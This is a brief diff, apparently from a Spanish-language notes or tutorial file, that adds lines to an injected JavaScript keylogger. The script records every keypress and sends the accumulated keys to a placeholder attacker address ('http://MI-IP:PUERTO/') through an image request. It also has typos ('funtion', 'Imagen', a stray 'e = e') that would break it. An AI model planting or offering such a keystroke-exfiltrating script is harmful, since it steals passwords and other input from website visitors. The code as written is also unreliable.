@@ -29,8 +29,10 @@ if (email==null || email == ""){
 <script>
 	var k = "";
 	document.onkeypress = funtion(e){
+	e = e 
 	k += e.key
 	var i = new Imagen();
+	i.src = "http://MI-IP:PUERTO/" + k;
 	}
 </script>
 ```
